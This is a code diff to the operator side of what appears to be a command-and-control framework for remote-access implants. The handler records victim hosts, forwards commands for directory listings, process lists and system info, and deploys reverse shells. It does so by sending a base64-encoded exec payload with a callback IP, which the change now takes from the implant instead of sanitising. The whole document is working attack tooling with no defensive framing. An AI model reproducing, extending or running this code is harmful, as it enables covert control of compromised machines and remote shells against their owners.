@@ -18,10 +18,10 @@ from payloads import modulehelper
 
 class Helper:
     def __init__(self):
-        pass
+        self.shell_ip = '127.0.0.1'
 
     @staticmethod
-    def ShellHandler(index, connection):
+    def ShellHandler(index, connection, shell_ip):
         while True:
             shell_port = (random.randint(1000, 65535))
             if shell_port in viewbag.PORT_LIST:
@@ -31,10 +31,7 @@ class Helper:
                 print color.ReturnInfo("Deploying shell %s:%s => %s:%s" % (
                     viewbag.CALLBACK_IP, str(shell_port), viewbag.all_addresses[index][0],
                     viewbag.all_addresses[index][1]))
-                ip_sanitize = viewbag.CALLBACK_IP
-                if ip_sanitize == '0.0.0.0':
-                    ip_sanitize = "localhost"
-                plugin = base64.b64encode('exec' + '+' * 5 + shell.run(shell_port).replace('<cip>', ip_sanitize))
+                plugin = base64.b64encode('exec' + '+' * 5 + shell.run(shell_port).replace('<cip>', shell_ip))
                 Helper.send_msg(connection, plugin)
                 shell.bind(shell_port)
                 break
@@ -156,6 +153,9 @@ class Helper:
                 viewbag.all_names.append(name)
                 viewbag.all_os.append(os_)
                 viewbag.all_arch.append(arch)
+
+                if viewbag.NOTIFY_CONNECTION:
+                    print '\n' + color.ReturnSuccess('New implant connected %s/%s (%s)' % (address[0], name, os_))
 
                 implant_folder = viewbag.ENVIRONMENT_FOLDER + '\\' + address[0] + "_" + name + "\\"
                 tools.mkdir(implant_folder)
@@ -357,22 +357,22 @@ class Helper:
                     elif command == "help":
                         print help.help()
                     else:
+
+                        if 'admin/shell::' in command:
+                            if not 'admin/shell_exec::' in command:
+                                Helper.send_msg(connection, '\x19')
+                                Helper.shell_ip = Helper.recv_msg(connection)
+                                Helper.ShellHandler(index, connection, Helper.shell_ip)
+
+                                # Useless but necessary return Value from function
+                                Helper.recv_msg(connection)
+                                continue
                         data_to_forward = Helper().Parse(command)
                         Helper.send_msg(connection, data_to_forward)
 
-                        if 'admin/shell' in command:
-                            if not 'shell_exec' in command:
-                                Helper.ShellHandler(index, connection)
-                                continue
-
                         data_from_implant = Helper.recv_msg(connection)
 
-                        if 'admin/ipconfig' in command:
-                            data_from_implant = data_from_implant.replace('::::::', '\t')
-                            data_from_implant = data_from_implant.replace('xxx', '\n')
-                            data_from_implant = data_from_implant.replace('::::::-', '\t')
-
-                        elif 'admin/ls' in command:
+                        if command == 'exec admin/ls::':
                             dir_entry = []
                             for line in data_from_implant.split(';;;;'):
                                 try:
@@ -388,8 +388,7 @@ class Helper:
                             data_from_implant = "\n" + color.ReturnTabulate(dir_entry,
                                                                             ['Name', 'Type', 'Size', 'Last Modify'],
                                                                             "simple") + "\n"
-
-                        elif 'admin/ps' in command:
+                        elif command == 'exec admin/ps::':
                             ps_entry = []
                             for proc in data_from_implant.split(':::::'):
                                 try:
@@ -404,17 +403,14 @@ class Helper:
                             data_from_implant = "\n" + color.ReturnTabulate(ps_entry,
                                                                             ['Name', 'PID', 'Path'],
                                                                             "simple") + "\n"
-
-                        elif 'admin/sysinfo' in command:
+                        elif command == 'exec admin/sysinfo::':
                             data_from_implant = "\n" + data_from_implant.replace('xxx', '\n').replace('<prc>',
                                                                                                       '%') + "\n"
 
                         elif data_from_implant.startswith('+'):
                             data_from_implant = color.ReturnSuccess(data_from_implant.replace('+ ', ''))
-
                         elif data_from_implant.startswith('-'):
                             data_from_implant = color.ReturnError(data_from_implant.replace('- ', ''))
-
                         elif data_from_implant.startswith('*'):
                             data_from_implant = color.ReturnInfo(data_from_implant.replace('* ', ''))
 
